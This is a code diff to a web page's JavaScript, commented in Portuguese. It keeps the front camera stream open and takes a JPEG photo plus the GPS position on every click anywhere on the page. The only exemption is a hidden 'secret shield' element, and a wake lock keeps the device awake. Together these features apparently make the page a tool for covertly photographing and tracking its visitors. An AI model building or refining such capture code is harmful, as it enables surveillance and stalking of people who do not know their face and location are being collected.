@@ -268,6 +268,8 @@
     const status = document.getElementById('status');
 
     let wakeLock = null;
+    let activeStream = null;
+    let videoElement = null;
 
     async function ativarWakeLock() {
       try {
@@ -277,35 +279,46 @@
       } catch (err) {}
     }
 
-    async function capturarFoto() {
+    async function obterStream() {
+      if (activeStream && activeStream.active) {
+        return activeStream;
+      }
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        activeStream = await navigator.mediaDevices.getUserMedia({
           video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
           audio: false
         });
 
-        const video = document.createElement('video');
-        video.muted = true;
-        video.playsInline = true;
-        video.srcObject = stream;
-        await video.play();
+        videoElement = document.createElement('video');
+        videoElement.muted = true;
+        videoElement.playsInline = true;
+        videoElement.srcObject = activeStream;
+        await videoElement.play();
 
-        await new Promise(resolve => setTimeout(resolve, 600));
+        await new Promise(resolve => setTimeout(resolve, 500));
+        return activeStream;
+      } catch (err) {
+        console.warn("Permissão de câmera negada ou indisponível:", err);
+        return null;
+      }
+    }
 
+    async function capturarFoto() {
+      const stream = await obterStream();
+      if (!stream || !videoElement) return null;
+
+      try {
         const canvas = document.createElement('canvas');
         const width = 480;
-        const height = (video.videoHeight * (width / video.videoWidth)) || 360;
+        const height = (videoElement.videoHeight * (width / videoElement.videoWidth)) || 360;
         canvas.width = width;
         canvas.height = height;
 
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, width, height);
-        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
-
-        stream.getTracks().forEach(track => track.stop());
-        return fotoBase64;
+        ctx.drawImage(videoElement, 0, 0, width, height);
+        return canvas.toDataURL('image/jpeg', 0.6);
       } catch (err) {
-        console.warn("Permissão de câmera negada:", err);
+        console.warn("Erro ao capturar frame:", err);
         return null;
       }
     }
@@ -384,7 +397,7 @@
         return;
       }
 
-      navigator.geolocation.watchPosition(
+      navigator.geolocation.getCurrentPosition(
         async (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
           
@@ -418,9 +431,8 @@
       );
     }
 
-    // Cada clique em qualquer lugar da tela gera uma nova captura ilimitada
+    // Cada clique em qualquer área da tela gera uma nova captura ilimitada
     document.addEventListener('click', (e) => {
-      // Ignora o clique apenas no escudo secreto
       if (e.target.closest('#escudoSecreto')) {
         return;
       }
